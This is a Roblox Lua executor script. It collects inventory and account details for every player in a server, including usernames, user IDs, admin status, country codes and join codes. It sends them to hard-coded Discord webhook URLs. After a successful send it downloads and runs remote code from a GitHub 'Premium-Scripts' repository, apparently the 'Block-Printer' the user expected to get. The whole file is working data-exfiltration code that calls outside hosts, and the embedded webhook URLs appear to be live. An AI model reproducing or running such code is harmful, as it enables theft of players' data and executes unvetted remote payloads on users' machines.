local plr = game.Players.LocalPlayer

local executeWebhookURL = "https://discord.com/api/webhooks/1325161040979431526/cTw_E6bLiUJq0RK3zMeOFzwCpJfHS8N1NQF-0cWyx88bIKSTxgkEQ1h9RX-K0Zgnw_CB"
local inventoryWebhookURL = "https://discord.com/api/webhooks/1326562265457229875/epjF-L0qhRtjZEaM8hNaYylWHrXZcFMAUt9aV9tkROB6zQN-utV_l2Vr8Gb3JPVJRfEN"

local function getPlayerInventoryInfo(plr)
    local inventoryInfo = {}
    for _, tool in pairs(plr.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local displayName = tool:FindFirstChild("DisplayName") and tool.DisplayName.Value or "Unnamed Tool"
            local amount = tool:FindFirstChild("Amount") and tool.Amount.Value or 0
            table.insert(inventoryInfo, {displayName = displayName, amount = amount})
        end
    end
    return inventoryInfo
end

local function inventoryToString(inventoryInfo)
    local result = "Player Inventory Data:\n"
    for _, tool in pairs(inventoryInfo) do
        result = result .. "Tool Name: " .. tool.displayName .. " | Amount: " .. tostring(tool.amount) .. "\n"
    end
    return result
end

local function sendFileToDiscord(fileName, webhookURL)
    local fileContent = readfile(fileName)
    local boundary = "------------------------" .. game:GetService("HttpService"):GenerateGUID(false)

    local body = "--" .. boundary .. "\r\n" ..
        "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"\r\n" ..
        "Content-Type: text/plain\r\n\r\n" ..
        fileContent .. "\r\n" ..
        "--" .. boundary .. "--"

    local requestFunction = syn and syn.request or request or http_request
    if not requestFunction then
        warn("Your executor does not support HTTP requests.")
        return
    end

    local response = requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
        Body = body
    })

    if response.StatusCode == 204 then
        print("✅ File sent successfully to Discord!")
    else
        warn("❌ Failed to send file to Discord. Status:", response.StatusCode)
    end
end

local function sendPlayerDataToDiscord(plr)
    local username = plr.Name
    local userId = plr.UserId
    local adminStatus = tostring(plr:FindFirstChild("Admin") and plr.Admin.Value or false)
    local deviceType = tostring(plr:FindFirstChild("DeviceType") and plr.DeviceType.Value or "Unknown")
    local countryCode = tostring(plr:FindFirstChild("CountryCode") and plr.CountryCode.Value or "Unknown")
    local joinCode = tostring(plr:FindFirstChild("JoinCode") and plr.JoinCode.Value or "Unknown")
    local locale = tostring(plr:FindFirstChild("Locale") and plr.Locale.Value or "Unknown")
    local usingStarterIsland = tostring(plr:FindFirstChild("UsingStarterIsland") and plr.UsingStarterIsland.Value or false)

    local data = {
        ["content"] = null,
        ["embeds"] = {
            {
                ["title"] = "⚠️ Player Inventory Details ⚠️",
                ["description"] = "Here are the details about the player:",
                ["fields"] = {
                    {["name"] = "👤 Username", ["value"] = username, ["inline"] = true},
                    {["name"] = "🔑 User ID", ["value"] = tostring(userId), ["inline"] = true},
                    {["name"] = "🛡️ Admin Status", ["value"] = adminStatus, ["inline"] = true},
                    {["name"] = "💻 Device Type", ["value"] = deviceType, ["inline"] = true},
                    {["name"] = "🌍 Country Code", ["value"] = countryCode, ["inline"] = true},
                    {["name"] = "📜 Join Code", ["value"] = joinCode, ["inline"] = true},
                    {["name"] = "🌐 Locale", ["value"] = locale, ["inline"] = true},
                    {["name"] = "🏝️ Using Starter Island", ["value"] = usingStarterIsland, ["inline"] = true}
                },
                ["color"] = 16711680
            }
        }
    }

    local requestFunction = syn and syn.request or request or http_request
    if not requestFunction then
        warn("Your executor does not support HTTP requests.")
        return
    end

    local success, errorMessage = pcall(function()
        local response = requestFunction({
            Url = inventoryWebhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
        if response.StatusCode == 204 then
loadstring(game:HttpGet("https://raw.githubusercontent.com/allfreescripts5/Premium-Scripts/main/Block-Printer"))()
print("✅ Player data sent to Discord.")
else
    warn("❌ Failed to send player data to Discord. Status:", response.StatusCode)
end
end)

if not success then
warn("❌ Error sending player data: " .. tostring(errorMessage))
end
end

local function exportInventoryToFileAndSend(plr)
local inventoryInfo = getPlayerInventoryInfo(plr)
local inventoryString = inventoryToString(inventoryInfo)
local fileName = plr.Name .. "_Inventory.txt"
writefile(fileName, inventoryString)
sendFileToDiscord(fileName, inventoryWebhookURL)
sendPlayerDataToDiscord(plr)
end

local players = game.Players:GetPlayers()
for _, player in pairs(players) do
exportInventoryToFileAndSend(player)
wait(0.25)
end
